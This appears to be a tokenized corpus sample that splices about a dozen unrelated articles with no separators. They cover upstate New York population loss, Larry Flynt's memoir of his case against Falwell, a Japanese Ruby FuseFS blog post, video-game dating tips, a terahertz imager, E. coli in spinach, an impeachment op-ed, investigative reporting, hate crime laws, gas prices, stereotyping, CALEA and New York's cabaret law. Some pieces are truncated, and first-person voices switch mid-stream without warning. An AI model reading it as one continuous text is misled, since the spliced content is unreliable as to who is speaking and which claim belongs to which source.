Upstate New York is staggering from an accelerating exodus of young adults , new census results show .
The migration is turning many communities grayer , threatening the long - term viability of ailing cities and raising concerns about the state 's future tax base .
From 1990 to 2004 , the number of 25 - to - 34 - year - old residents in the 52 counties north of Rockland and Putnam declined by more than 25 percent .
In 13 counties that include cities like Buffalo , Syracuse and Binghamton , the population of young adults fell by more than 30 percent .
In Tioga County , part of Appalachia in New York 's Southern Tier , 42 percent fewer young adults were counted in 2004 than in 1990 .
" Make no mistake : this is not business as usual , " Robert G. Wilmers , the chairman of M & T Bank in Buffalo , told his shareholders this spring .
" The magnitude and duration of population loss among the young is unprecedented in our history .
There has never been a previous 10 - year period in the history of the upstate region when there has been any decline in this most vital portion of our population . "
In New York City and the five suburban counties in New York State , the number of people ages 18 to 44 increased by 1.5 percent in the 1990's .
Upstate , it declined by 10 percent .
THE FIRST TIME the Rev. Jerry Falwell put his hands on me , I was stunned .
Not only had we been archenemies for 15 years , his beliefs and mine traveling in different solar systems , and not only had he sued me for $ 50 million ( a case I lost repeatedly yet eventually won in the Supreme Court ) , but now he was hugging me in front of millions on the Larry King show .
It was 1997 .
My autobiography , “ An Unseemly Man , ” had just been published , describing my life as a publisher of pornography .
The film “ The People vs. Larry Flynt ” had recently come out , and the country was well aware of the battle that Falwell and I had fought : a battle that had changed the laws governing what the American public can see and hear in the media and that had dramatically strengthened our right to free speech .
King was conducting the interview .
It was the first time since the infamous 1988 trial that the reverend and I had been in the same room together , and the thought of even breathing the same air with him made me sick .
I disagreed with Falwell ( who died last week ) on absolutely everything he preached , and he looked at me as symbolic of all the social ills that a society can possibly have .
But I ’d do anything to sell the book and the film , and Falwell would do anything to preach , so King ’s audience of 8 million viewers was all the incentive either of us needed to bring us together .
But let ’s start at the beginning and flash back to the late 1970s , when the battle between Falwell , the leader of the Moral Majority , and I first began .
I was publishing Hustler magazine , which most people know has been pushing the envelope of taste from the very beginning , and Falwell was blasting me every chance he had .
He would talk about how I was a slime dealer responsible for the decay of all morals .
He called me every terrible name he could think of — names as bad , in my opinion , as any language used in my magazine .
After several years of listening to him bash me and reading his insults , I decided it was time to start poking some fun at him .
So we ran a parody ad in Hustler — a takeoff on the then - current Campari ads in which people were interviewed describing “ their first time . ”
In the ads , it ultimately became clear that the interviewees were describing their first time sipping Campari .
But not in our parody .
We had Falwell describing his “ first time ” as having been with his mother , “ drunk off our God- fearing asses , ” in an outhouse .
Apparently , the reverend did n’t find the joke funny .
He sued us for libel in federal court in Virginia , claiming that the magazine had inflicted emotional stress on him .
It was a long and tedious fight , beginning in 1983 and ending in 1988 , but Hustler Magazine Inc. vs. Jerry Falwell was without question my most important battle .
We lost in our initial jury trial , and we lost again in federal appeals court .
After spending a fortune , everyone ’s advice to me was to just settle the case and be done , but I was n’t listening ; I was n’t about to pay Falwell $ 200,000 for hurting his feelings or , as his lawyers called it , “ intentional infliction of emotional distress . ”
We appealed to the U.S. 4th Circuit Court of Appeals , and I lost for a third time .
Everyone was certain this was the end .
We never thought the U.S. Supreme Court would agree to hear the case .
But it did , and though I felt doomed throughout the trial and was convinced that I was going to lose , we never gave up .
As we had moved up the judicial ladder , this case had become much more than just a personal battle between a pornographer and a preacher , because the 1st Amendment was so much at the heart of the case .
To my amazement , we won .
It was n’t until after I won the case and read the justices ’ unanimous decision in my favor that I realized fully the significance of what had happened .
The justices held that a parody of a public figure was protected under the 1st Amendment even if it was outrageous , even if it was “ doubtless gross and repugnant , ” as they put it , and even if it was designed to inflict emotional distress .
In a unanimous decision — written by , of all people , Chief Justice William H. Rehnquist — the court reasoned that if it supported Falwell ’s lower - court victory , no one would ever have to prove something was false and libelous to win a judgment .
All anyone would have to prove is that “ he upset me ” or “ she made me feel bad . ”
The lawsuits would be endless , and that would be the end of free speech .
Everyone was shocked at our victory — and no one more so than Falwell , who on the day of the decision called me a “ sleaze merchant ” hiding behind the 1st Amendment .
Still , over time , Falwell was forced to publicly come to grips with the reality that this is America , where you can make fun of anyone you want .
That had n’t been absolutely clear before our case , but now it ’s being taught in law schools all over the country , and our case is being hailed as one of the most important free - speech cases of the 20th century .
No wonder that when he started hugging me and smooching me on television 10 years later , I was a bit confused .
I had n’t seen him since we ’d been in court together , and that night I did n’t see him until I came out on the stage .
I was expecting ( and looking for ) a fight , but instead he was putting his hands all over me .
I remember thinking , “ I spent $ 3 million taking that case to the Supreme Court , and now this guy wants to put his hand on my leg ? ”
Soon after that episode , I was in my office in Beverly Hills , and out of nowhere my secretary buzzes me , saying , “ Jerry Falwell is here to see you . ”
I was shocked , but I said , “ Send him in . ”
We talked for two hours , with the latest issues of Hustler neatly stacked on my desk in front of him .
He suggested that we go around the country debating , and I agreed .
We went to colleges , debating moral issues and 1st Amendment issues — what ’s “ proper , ” what ’s not and why .
In the years that followed and up until his death , he ’d come to see me every time he was in California .
We ’d have interesting philosophical conversations .
We ’d exchange personal Christmas cards .
He ’d show me pictures of his grandchildren .
I was with him in Florida once when he complained about his health and his weight , so I suggested that he go on a diet that had worked for me .
I faxed a copy to his wife when I got back home .
The truth is , the reverend and I had a lot in common .
He was from Virginia , and I was from Kentucky .
His father had been a bootlegger , and I had been one too in my 20s before I went into the Navy .
We steered our conversations away from politics , but religion was within bounds .
He wanted to save me and was determined to get me out of “ the business . ”
My mother always told me that no matter how repugnant you find a person , when you meet them face to face you will always find something about them to like .
The more I got to know Falwell , the more I began to see that his public portrayals were caricatures of himself .
There was a dichotomy between the real Falwell and the one he showed the public .
He was definitely selling brimstone religion and would do anything to add another member to his mailing list .
But in the end , I knew what he was selling , and he knew what I was selling , and we found a way to communicate .
I always kicked his ass about his crazy ideas and the things he said .
Every time I ’d call him , I ’d get put right through , and he ’d let me berate him about his views .
When he was getting blasted for his ridiculous homophobic comments after he wrote his “ Tinky Winky ” article cautioning parents that the purple Teletubby character was in fact gay , I called him in Florida and yelled at him to “ leave the Tinky Winkies alone . ”
When he referred to Ellen Degeneres in print as Ellen “ Degenerate , ” I called him and said , “ What are you doing ?
You do n’t need to poison the whole lake with your venom . ”
I could hear him mumbling out of the side of his mouth , “ These lesbians just drive me crazy . ”
I ’m sure I never changed his mind about anything , just as he never changed mine .
I ’ll never admire him for his views or his opinions .
To this day , I ’m not sure if his television embrace was meant to mend fences , to show himself to the public as a generous and forgiving preacher or merely to make me uneasy , but the ultimate result was one I never expected and was just as shocking a turn to me as was winning that famous Supreme Court case :
We became friends .
凹 [ Ruby ] Ruby のFuseFS使ってtwitter file systemを作ってみた
連休中，一度もプログラムを書かなかったので，最後の日くらいプログラム書こうと思って，
スパイダーマン見ながらシコシコと書く．
何度見てもヒロインがおばちゃん顔でスパイダーマンに感情移入できないなぁ…
さて，ブツはココ ． FuseFSはもちろん，JSON impl for Rubyも必要． FUSEの勉強のために作ったんで，たいしたことはできませんが，もしかしたら今後面白いことができるようになるかも．
使い方は↓こんな感じ．
copy config.sample config vi config ← username_hereとpassword_hereをtwitterにログインする奴で書き換える mkdir ~/twfs ruby twfs.rb config ~/twfs
これで，~/twfsにtwitter file systemがマウントされます．
ディレクトリ構成はこんなふうになってます．
~/twfs |-- followers | `-- ... |-- friends | `-- ... `-- timelines |-- friends_timeline |-- public_timeline `-- user_timeline
followersとfriendsの下には，それぞれfollowerとfriendのスクリーン名でディレクトリがあって，さらにその下にいろいろファイルがあります．まぁ見れば分かると思います．
デフォルトでは60秒間隔で更新されます．
friends_timelineなどの配下にはxmlとかjsonとかいうファイルがあって，catするとファイル名の形式でtimelineが取れます． こっちは，catする度にtwitter.comにGETしに行きます． 日本語が悲しいことになってます…
で，具体的には↓こんなことができます．
kita@ubuntu % cd ~/ twfs kita@ubuntu % ls followers / friends / timelines / kita@ubuntu % cd tokyoforecast / kita@ubuntu % ls description id location name profile_image_url protected screen_name status / url kita@ubuntu % cat name Tokyo Forecast kita@ubuntu % cat status / text .
06日（日）の天気は雨、最高気温は19°C
最低気温 は16°Cでしょう。
http://tinyurl.com/yva684 kita@ubuntu % cd ../../timelines/public_timeline/ kita@ubuntu % ls atom json rss xml kita@utuntu % cat rss | head < ?xml version = " 1.0 " encoding = " UTF - 8 " ?> < rss version = " 2.0 " > < channel > < title > Twitter public timeline </ title > < link >

そんだけ ．
追記 : 初FUSEだったんだけど，手軽にファイルシステム作れて楽しいなぁ．
これもオレってばスゲー感が強い．
追 記2 : なんか色々追加したいことができてきた． 少なくともtweetの書き込みと，timelineの見易い表示くらいはできるようにしたい．
でも会社からだとtwitter がDatingカテゴリでURLフィルタに弾かれちゃうので，休み時間でもイジれないー．
追 記3 : あ ，Ruby Twitter Gem使った方がカッコよかったかも ?

2 Present it as quality time .
Remind your girlfriend that if you both play video games , you 'll be able to spend even more quality time together .
However , be aware that it will only count as quality time if she actually does enjoy it , so try not to force an argument about this .

3 Disguise it as exercise .
If you have a Wii fit , you can make video game playing part of an exercise routine that the both of you can do together .
This is one of your best bets to help her find a game she not only enjoys , but will want to play with you as well .

Buy her video game items .
There are plenty of video game accessories you could buy her that are also stylish .
Tetris bracelets or Mario mushroom earrings are both good options for this .
We 're all about giving golf claps where they 're due , and a healthy round is certainly in order for Mr. Brian Schulkin .
The doctoral student in physics developed a breakthrough terahertz imaging device , dubbed a T - ray , that has already demonstrated its ability to " detect cracks in space shuttle foam , image tumors in breast tissue , and spot counterfeit watermarks on paper currency . "
The Mini-Z marks the first time such a powerful device has become portable in nature , weighing just five pounds and taking up about as much space as your average laptop .
Taking home the first Lemelson - Rensselaer Student Prize ( $ 30,000 ) , Schulkin explained that this device did n't pose the same health risks as typical X - rays , and unlike ultrasound , terahertz waves can provide images and spectroscopic information without contacting an object .
As expected , the patent - pending technology is already up for licensing , and has already received quite a bit of fanfare and commercial interest from larger companies .
So while you may never personally encounter Brian 's earth - shattering invention , we 're fairly sure this young lad 's working days are already drawing nigh if he so chooses .

FARMERS and food safety officials still have much to figure out about the recent spate of E. coli infections linked to raw spinach .
So far , no particular stomachache has been traced to any particular farm irrigated by any particular river .
There is also no evidence so far that Natural Selection Foods , the huge shipper implicated in the outbreak that packages salad greens under more than two dozen brands , including Earthbound Farm , O Organic and the Farmer ’s Market , failed to use proper handling methods .
Indeed , this epidemic , which has infected more than 100 people and resulted in at least one death , probably has little do with the folks who grow and package your greens .
The detective trail ultimately leads back to a seemingly unrelated food industry — beef and dairy cattle .
First , some basic facts about this usually harmless bacterium : E. coli is abundant in the digestive systems of healthy cattle and humans , and if your potato salad happened to be carrying the average E. coli , the acid in your gut is usually enough to kill it .
For a year now , Democratic leaders like Rep. Rahm Emanuel ( D - IL ) , Rep. Nancy Pelosi D- CA ) , Sen. Harry Reid ( D - NV ) and DNC head Howard Dean have been working to tamp down the pressures to hold the president accountable for his crimes and abuses of power by way of impeachment .
House Speaker Pelosi for her part made it clear after the Democrats won the House that she would tolerate no talk of impeachment , even reportedly threatening one - time impeachment advocate Rep.
John Conyers ( D - MI ) with the denial of his cherished position as chair of the House Judiciary Committee if he pushed ahead with or accepted bills of impeachment from other House members .
House leaders and Democratic Party leaders also worked behind the scenes to kill off grassroots attempts to follow Thomas Jefferson ’s alternative route to impeachment by getting state legislatures to pass bicameral impeachment resolutions .
They strong - armed legislative leaders in the senates of both Washington State and New Mexico to block efforts to put such resolutions to a floor debate and vote in those two states , and have been working mightily to block a similar grassroots campaign in Vermont .
But the Democratic Party ’s efforts to tamp down impeachment efforts are coming unraveled , courtesy of the ongoing criminality of the Bush administration , which seems hell - bent on aggrandizing as much executive power as it possibly can before the clock runs out on Bush ’s second term of office .
Democratic state committees , the top party organizations at the state level , in both Oregon and Vermont , have overwhelmingly passed resolutions calling on the House of Representatives to initiate impeachment proceedings .
In Vermont , 38 towns -- roughly a third of those holding annual town meetings this past month -- voted impeachment resolutions ( only six were rejected ) , and an effort continues to move forward in both houses of that state ’s legislature to introduce and pass a Jeffersonian impeachment resolution to send to the House in Washington .
Other efforts are underway in New Jersey and Maine .
Republican Senator and presidential dark horse Chuck Hagel of Nebraska has publicly stated that impeachment is a possibility , given the president ’s arrogant rejection of public or congressional accountability with regard to the war in Iraq and other issues .
Rep. Dennis Kucinich ( D - OH ) has openly talked of submitting a bill of impeachment .
What ’s missing in all this has been media attention .
In fact , until lately , the media have pretty much only reported about impeachment in the negative , running stories when an impeachment resolution gets blocked by a state legislature , but not when it gets backed by a legislative committee , or by a Democratic state party organization .
There has not been a scientific poll asking about impeachment sentiment since last October , when Newsweek Magazine published a poll showing that an astonishing 51 percent of Americans favored impeachment -- half of those people even saying it should be a priority for Congress .
Now things may be starting to change .
Sen .
Hagel ’s comments on the possibility of impeachment , first made in a Vanity Fair magazine profile , were reported on ABC , and impeachment advocate John Nichols was interviewed about impeachment and Hagel ’s comment on MSNBC .
CNN also ran a story .
That ’s not much , but it ’s an indication that the ground is shifting .
With the White House pushing forward with a new war - marketing campaign -- this time against Iran - - and given mounting evidence of new White House crimes , from the political firing of federal prosecutors and the abusive use of national security letters by the FBI to spy on tens of thousands of Americans , to the disaster of the show trials in Guantanamo , to the lying by Attorney General Alberto Gonzales , to evidence of both President Bush ’s and Vice President Cheney ’s involvement in the outing of and obstruction of justice into the investigation into the outing of CIA agent Valerie Plame , to the escalation of the war in Iraq and to the lying about and enforced manipulation of government evidence on global warming , the American people are getting completely fed up with the Bush administration .
A recent poll found that as lame as it has been in challenging the Bush agenda over the last six years , the Democratic Party has now become the favored choice of 50 percent of Americans , while support for the Republican Party has fallen to only 35 percent — barely higher than the paltry 30 percent who still cling to their support of the president himself .
It would seem to be only a matter of time before Pelosi and the rest of the Democratic Party leadership will be forced to open the floodgates and permit the filing of impeachment bills .
The arguments made against impeachment -- that it would be “ divisive , ” that it would interfere with more “ pressing matters ” in Congress , that it would mean making the almost universally loathed Cheney president , and that it would “ hurt Democrats ” in 2008 -- are all looking increasingly shop - warn and contrived .
In fact , as the Bush crimes against the public , the Republic , the law and Constitution mount , the Democratic defenders of the president against impeachment are increasingly looking simply cynical and ridiculous .

IN AN E-MAIL uncovered and released by the House Judiciary Committee last month , Tim Griffin , once Karl Rove ’s right - hand man , gloated that “ no [ U.S. ] national press picked up ” a BBC Television story reporting that the Rove team had developed an elaborate scheme to challenge the votes of thousands of African Americans in the 2004 election .
Griffin was n’t exactly right .
The Los Angeles Times did run a follow - up article a few days later in which it reported the findings .
But he was essentially right .
Most of the major U.S. newspapers and the vast majority of television news programs ignored the story even though it came at a critical moment just weeks before the election .
According to Griffin ( who has since been dispatched to Arkansas to replace one of the U.S. attorneys fired by the Justice Department ) , the mainstream media rejected the story because it was wrong .
“ That guy is a British reporter who accepted some false allegations and made a story up , ” he said .
Advertisement
Let ’s get one fact straight , Mr. Griffin .
“ That guy ” is not a British reporter .
I am an American living abroad , putting investigative reports on the air from London for the British Broadcasting Corp .
I ’m not going to argue with Rove ’s minions about the validity of our reporting , which led the news in Britain .
But I can tell you this :
To the extent that it was ignored in the United States , it was n’t because the report was false .
It was because it was complicated and murky and because it required a lot of time and reporting to get to the bottom of it .
In fact , not one U.S. newsperson even bothered to ask me or the BBC for the data and research we had painstakingly done in our effort to demonstrate the existence of the scheme .
The truth is , I knew that a story like this one would never be reported in my own country .
Because investigative reporting -- the kind Jack Anderson used to do regularly and which was carried in hundreds of papers across the country , the kind of muckraking , data - intensive work that takes time and money and ruffles feathers -- is dying .
I ’ve been through this before , too many times .
Take this investigative report , also buried in the U.S. : Back in December 2000 , I received two computer disks from the office of Florida Secretary of State Katherine Harris .
Analysis of the data , plus documents that fell my way , indicated that Harris ’ office had purged thousands of African Americans from Florida ’s voter rolls as “ felons . ”
Florida now admits that many of these voters were not in fact felons .
Nevertheless , the blacklisting helped cost Al Gore the White House .
Advertisement
I reported on the phony felon purge in Britain ’s Guardian and Observer and on the BBC while Gore was still in the race , while the count was still on .
Yet the story of the Florida purge never appeared in the U.S. daily papers or on television .
Until months later , that is , after the Supreme Court had decided the election , when it was picked up by the Washington Post and others .
U.S. papers delayed the story until the U.S. Civil Rights Commission issued a report saying our Guardian / BBC story was correct : Innocents lost their vote .
At that point , protected by the official imprimatur , American editors felt it safe enough to venture out with the story .
But by then , George W. Bush could read it from his chair in the Oval Office .
Again and again , I see this pattern repeated .
Until there is some official investigation or allegation made by a politician , there is no story .
Advertisement
Or sometimes the media like to cover the controversy , not the substance , preferring an ambiguous and unsatisfying “ he said , she said ” report .
Safe reporting , but not investigative .
I know some of the reasons why investigative reporting is on the decline .
To begin with , investigations take time and money .
A producer from “ 60 Minutes , ” watching my team ’s work on another voter purge list , said : “ My God !
You ’d have to make hundreds of calls to make this case . ”
In America ’s cash - short , instant - deadline world , there ’s not much room for that .
Are there still aggressive , talented investigative reporters in the U.S. ?
There are hundreds .
I ’ll mention two : Seymour Hersh , formerly of the New York Times , and Robert Parry , formerly of the Associated Press , who uncovered the Iran - Contra scandal .
The operative word here is “ formerly . ”
Parry tells me that he can no longer do this kind of investigative work within the confines of a U.S. daily newsroom .
One of the biggest disincentives to doing investigative journalism is that it jeopardizes future access to politicians and corporate elite .
During the I. Lewis “ Scooter ” Libby trial , the testimony of Judith Miller and other U.S. journalists about the confidences they were willing to keep in order to maintain access seemed to me sadly illuminating .
Advertisement
Expose the critters and the door is slammed .
That ’s not a price many American journalists are willing to pay .
It ’s different in Britain .
After the 2000 election , when Harris ’ lawyer refused to respond to our evidence , my BBC producer made sure I chased him down the hall waving the damning documents .
That ’s one sure way to end “ access . ”
Reporters in Britain must adhere to extraordinarily strict standards of accuracy because there is no Bill of Rights , no “ freedom of the press ” to provide cover against lawsuits .
Further , the British government fines reporters who make false accusations and jails others who reveal “ official secrets . ”
I ’ve long argued that Britain needs a 1st Amendment right to press freedom .
It could , of course , borrow ours .
We do n’t use it .
There are , I think , two coherent positions on hate crime laws .
The first is opposition to the entire concept , its chilling effect on free speech , its undermining of the notion of equality under the law , and so on .
That 's my position .
I oppose all hate crimes laws , regardless of the categories of individuals they purport to protect .
The other coherent position is the view that hate crimes somehow impact the community more than just regular crimes and that the victims of such crimes therefore deserve some sort of extra protection under the law .
The criteria for inclusion in such laws is any common prejudice against a recognizable and despised minority .
The minority need not be defined by an involuntary characteristic - religious minorities are so protected - and they choose their faith .
Nor need the minority be accurately idetified .
If a gentile is bashed because the attacker thinks he 's Jewish , the hate crime logic still applies .
I disagree with this , but I can accept its coherence .
But the one truly incoherent position is that hate crimes laws are fine for all targeted groups except gays .
Gays are among the most common victims of hate crimes , and straight people are also targeted for being gay even when they 're not .
If you 're going to buy the whole concept of hate crimes , it makes no sense to exclude gays - none .
Notice we need no discussion of the morality or otherwise of homosexuality .
All that is being punished is the perception of someone else 's identity .
A straight , evangelical married man could have recourse if he was bashed because someone merely perceived him to be gay .
A celibate gay man in reparative therapy could have recourse as well .
So no serious moral argument can be made to distinguish the gay victims of hate crimes from other victims .
GAS PRICES GAS PRICES State - by - state gasoline averages from AAA GAS CALCULATORS GAS CALCULATORS
Calculate the cost of gas for a trip between two cities Calculate your cost of gasoline if you do n't know your car 's average gas mileage Gasoline prices are falling fast and could keep dropping for months .
" The only place they have to go is down , " says Fred Rozell , gasoline analyst at the Oil Price Information Service ( OPIS ) .
" We 'll be closer to $ 2 than $ 3 come Thanksgiving . "
Travel organization AAA foresees prices 10 cents a gallon lower by the end of next week .
It reported a nationwide average of $ 2.84 Tuesday , the lowest since April 20 .
PRICE HAPPY : OPEC president says $ 70 a barrel oil price is satisfactory
It 's good news for consumers and the economy .
Continued lower prices " may act like a tax cut " and stimulate spending , says Richard DeKaser , chief economist at National City in Cleveland .
He calculates that higher energy prices the first six months cut growth of consumer spending 1 percentage point .
The U.S. average for a gallon of regular peaked this year at $ 3.036 Aug. 10 , according to OPIS / AAA daily surveys .
That 's slightly under the high of $ 3.057 Sept. 5 , a week after Hurricane Katrina battered petroleum production in the Gulf of Mexico and caused fears of fuel shortages .
OPIS ' Rozell figures prices will jump again next spring .
Behind the current drop : • The end of summer .
Driving slows , reducing demand for gasoline .
And federal requirements for clean air , summer - blend gasoline end next month , making gasoline cheaper to refine and import .
• Sluggish demand .
Gasoline use in the first eight months of the year is up 1 % vs. a year ago , less than the 1.5 % to 2 % growth that 's typical , says Michael Morris , analyst at the U.S. Energy Information Administration .
" Wholesalers are trying to get rid of product .
The growth in demand for gasoline has really tapered off , " he says .
Wholesale prices are falling faster than retail gasoline prices , meaning stations are making more money than when prices were $ 3 .
Wholesale prices Tuesday ranged from $ 1.77 to $ 1.79 a gallon , well below the $ 2 - plus prices typical until recently .
• Petroleum traders , worried that prices are too high to last , are selling their holdings .
That pushes prices down .
They also believe hurricanes wo n't disrupt Gulf of Mexico production , OPIS senior analyst Tom Kloza says .
Crude oil , which accounts for roughly half the price of gasoline , ended New York trading Tuesday down 90 cents , at $ 69.71 a barrel .
That 's the first time it 's closed at less than $ 70 since May 4 .

I was in Texas and Oklahoma last week .
In the course of the trip , I was in a number of situations where I had to make conversation with people I did n’t know .
Looking back on those conversations , I realize that when I was talking to white , male businessmen and needed to come up something to say , I generally chose the subject of college football .
For lack of a better word , let ’s call this “ conversational discrimination . ”
I do n’t assume that every stranger I meet wants to talk about college football .
But I drew an inference about my conversational partner , based on his membership in the “ white - male - businessmen of Texas and Oklahoma group ” and used that inference to direct my behavior .
As Judge Posner reminded us , in his review of Blink , in situations where one does n’t know a lot about an individual , it may “ sensible to ascribe the group 's average characteristics to each member of the group , even though one knows that many members deviate from the average . ”
As it turns out , my assumption was largely correct .
I had lot of really great conversations about college football .
( Let 's be clear this was not a hardship : I 'm happy to talk about college football until the cows come home ) .
The reason this stereotype was so useful was that I used as much of the available information about my conversational partner as I could .
The fact that I was in Texas and Oklahoma mattered a lot .
I would n’t have assumed that I could talk about college football with a similar group of white male business types from , say , Silicon Valley .
The fact that they were businessmen mattered , and not , say , graphic designers or actors .
The fact that they were men and not women mattered , and I know from experience that if I ’m choosing a sports topic for conversation with an black male businessman , I ’ll probably guess basketball — particularly if the person I ’m talking to is from the East Coast .
The point is the accuracy of stereotypes is a reflection — in large part — of their specificity : the more information you can use to build a generalization , the better off you are .
This is my third ( and last ) comment on the Ayres study .
My first point , as those of you who have been following my thoughts on this know , is that price discrimination against black males by car salesmen is morally wrong .
My second point is that it is a bad business strategy .
My third — and in some ways most important point — is that its lousy stereotyping .
Let ’s go back to the study .
The male and female , black and white testers who Ayres sent out to car dealerships all gave the salesmen the same set of facts .
They were all roughly the same age ( late twenties ) .
They all drove the same kind of car into the lot .
They all dressed neatly and conservatively .
They identified themselves as college - educated professionals ( sample job : systems analyst at a bank ) .
And they said they lived in the upper - income Chicago neighborhood of Streeterville .
The car salesman , then , has several pieces of data from which to create his stereotype .
He has the gender , race , age , occupation , educational level , and class ( or at least a class proxy ) of his potential customer .
And what did he do ?
With the black men , he zeroed in on age and race , and ignored everything else .
In his critique of my analysis of Ayres , Judge Posner did the same thing .
When he says that it may be “ sensible to ascribe the group 's average characteristics to each member of the group , ” the “ group ” he ’s talking about is race .
But why is Posner — like the car salesmen — so hung up about race ?
Would n’t it be just as sensible , in the case of black men , to define their “ group ” as the group of college - educated , upper income professionals ?
So too with Steve Sailer .
He says that car salesman are acting rationally , based on the fact that black men — as a group — like to be seen overpaying for cars .
I have made my feelings known about what I see as the motivation behind that particular comment .
But let ’s just focus here on its appropriateness .
Why is Sailer — like Posner and Ayres ’car dealers — so intent on zeroing in on what is only one of many available and relevant facts about the customer ?
The short answer to that question , I think , is that this is what racial prejudice is : it is the irrational elevation of race - based considerations over other , equally or more relevant factors .
But let me make two other points .
First , thinking of the Ayres study this way gives us , I think , some insight into the anger that continues to be felt in the African - American community over discrimination .
Put yourself in the shoes of one of those black males in Ayres study .
You go to college .
You get a good job .
You make a lot of money .
You move to a posh neighborhood .
And when you walk into a car dealership all of those achievemens — and what they signal about you — vanish , and the salesmen only sees the color of your skin .
Can you understand now why I ’ve been hammering away on this subject ?
Second , some of the commenters to my previous posts seem to have been of the opinion that price discrimination represented a kind of shrewd , profit - maximization strategy by salesmen .
Shrewd ?
Tell me what ’s so shrewd about being given four critical facts about a potential customer , and deciding to discard three of them ?
Back in 2005 - 2006 , when CALEA ( the Communications Assistance for Law Enforcement Act ) was being expanded to cover broadband providers and VoIP companies , libraries and universities raised a massive ruckus over the plan .
Their worry was that CALEA would require any network that connected to the public Internet to comply with FBI wiretapping guidelines ; universities across the country would be faced with a multibillion dollar bill for upgrading their networks .
Now that the new CALEA rules are in effect ( the deadline for compliance was Monday ) , how are universities and libraries handling the issue ?
In large part , they are n't .
That 's because the FCC and the Department of Justice clarified some of the CALEA provisions last year after several educational library groups took them to court .
Even after the various rulings were handed down , " much information related to the CALEA order remains confusing and incomplete , " according to EDUCAUSE , one of the groups involved in the cases .
Despite the vagueness of several key provisions and terms , this much became clear after the court decisions : " with rare possible exceptions , universities , colleges , and libraries are exempt from CALEA . "
Networks are exempt from the electronic surveillance rules if they meet two tests : they must be private , and the institution that runs them must not " support " the Internet connection .
A " private " network is not actually defined , but legal analysis by educational groups has concluded that universities are private networks so long as they do not offer Internet access to other groups in turn , like municipal organizations or local communities .
But this raises a question : how " private " does a private network have to be ?
Most of the network traffic on college and university networks is generated by faculty , staff , and students of those institutions , but most schools also provide some public access in libraries and other common spaces .
Does this mean that the schools lose their CALEA exemption ?
Most legal opinions we have seen suggest that it does not , but because there is no hard and fast guidance , some suggest erring on the side of caution .
American University stopped offering public Internet access in its library earlier this week for exactly this reason .
Assuming that a school 's network is private , the next question concerns the Internet connection .
If the line and routing hardware is maintained by a telecommunications company , then the school remains exempt from CALEA .
If the school runs its own fiber links to another network or even manages its own gateway router , it may incur obligations under CALEA .
If that happens , schools wo n't need to replace every router on campus , as was once feared .
The gateway router may need to be replaced in order to make it easy to siphon off traffic from one IP address or user and funnel it to the feds , but this work can also be handled by a Trusted Third Party ( for a fee , of course ) .
In neither case will the entire network architecture need to be reworked .
In 2005 , when the new rules were being proposed , the FCC noted that CALEA would not be extended to libraries " that acquire broadband Internet access service from a facilities - based provider to enable their patrons for customers to access the Internet . "
The American Library Association worries that this is n't good enough , though , writing in January 2007 that " it is possible the private network connections that serve libraries still could be subject to CALEA obligations " though their connections to regional library networks or universities .
Currently , though , it does not appear that most libraries believe they must comply .
Regardless of how CALEA is applied , libraries and universities both have an obligation to comply with government wiretap requests ; CALEA simply will make those requests much easier for the feds to make ( and it does not currently expand reporting requirements to include e-mail or web browsing information ) .

It ’s not often this urbane metropolis gets compared to a small town with repressive mores .
But that ’s the sentiment among a band of local dancers , who last week lost a fight to overturn a Prohibition - era law that bans social dancing in New York outside of specially licensed venues .
“ It is right out of that movie ‘ Footloose , ’ ” said Paul Chevigny , a New York University Law School professor who represents the dance advocates .
“ In my view , underneath it all is the fact that there ’s always been a puritanical fear of social dance .
It ’s a form of expression with the body , and people are just afraid of that . ”
The 1926 law , which requires bars and restaurants to obtain a cabaret license before three or more patrons can dance , is rooted in efforts to crack down on speak - easies and interracial Harlem jazz clubs .

Over the years , as once - industrial neighborhoods gentrified , the city also tightened zoning rules -- pushing dance clubs into major commercial centers and manufacturing areas .
And applying for a cabaret license is an arduous process , critics say .
There are about 150 licensed cabarets in New York , according to the city ’s Department of Consumer Affairs , and 42 pending applications .
Dancers say most of those play club and house music , whereas just a handful of venues offer genres such as country and western , salsa , tango , ballroom and swing .
“ It ’s created a self - fulfilling prophecy , ” said Chevigny , who argued the court case with civil rights attorney Norman Siegel .
“ People fear the noise and crowds due to dancing , but because a dance license can only be obtained in isolated neighborhoods where it ’s difficult to attract people , the licenses tend to go to people with really deep pockets who open a really big place . ”
City officials cast the restrictions as a quality - of - life issue .

“ It ’s not about stopping people from dancing , ” said Connie Pankratz , a spokeswoman for the city Law Department .
“ It ’s really about protecting residential communities .
There are people who want to dance and people who want to have a restful night ’s sleep , so you do n’t have cabarets in residential neighborhoods . ”
Though the law has been on the books for more than 80 years , dance promoters said it was n’t rigorously enforced until the late 1990s , when then - Mayor Rudolph W. Giuliani cracked down on nightclubs in an effort to curtail crime .
Until then , few dance venues sought cabaret licenses .
Philip Rodrigue had just opened a music club in the Meatpacking District when the city enforcement efforts began .
He quickly applied for a cabaret license , a process that proved to be exasperating , he said .
“ It took me 18 months to pull paperwork that I should have been able to pull in a matter of weeks , ” Rodrigue said .
“ I was tearing my hair out . ”

In the end , he got the license but had lost so much revenue that he was forced to sell the club .
Recreational dancers say bars are so wary of being fined for illegal dancing that bouncers will ask customers to sit down if they notice movement that might be considered illicit .
Some determined dancers seek out underground clubs .
“ We were in a space once that got raided by the police , and the management quickly put on horrible music so everyone would stop dancing , ” said Ian Dutton , an airline pilot who likes to dance to goth - industrial music .
“ Are we really talking about New York in the 21st century where we need dance police ? ”
Two years ago , Dutton , three other individuals and the Gotham Swing Club , a social dance group , filed a lawsuit against the city challenging the restrictions .
They argued that the cabaret law limited freedom of expression and the zoning restrictions violated due - process guarantees .

“ This is the arts capital of the world , ” said Amber Henrie , vice president of the Gotham Swing Club , which holds some of its parties on Wednesdays because weekend venues are too hard to come by .
“ It ’s very disheartening that we do n’t have these opportunities . ”
The lawsuit drew support from Metropolis in Motion , a group of New Yorkers pushing to lift the dance restrictions .
This month , in frigid weather , the organization held a 24 - hour outdoor dance marathon in Madison Square Park to raise public awareness about the cabaret law .
But the courts sided with the city .
On Thursday , the state Supreme Court Appellate Division upheld a justice ’s April dismissal of the lawsuit .
“ We welcome the court ’s decision , which properly recognized that recreational dancing is not a form of expression protected by the federal or state constitutions , ” said Norman Corenthal , senior counsel in the city Law Department Appeals Division .

The dance fans are downcast but plan to appeal again .
“ I just do n’t understand how they cannot consider dancing a form of self - expression , ” said John Festa , a swing promoter who was one of the plaintiffs .
“ It ’s incomprehensible .
Then what is it ?
An expression of futility ? ”
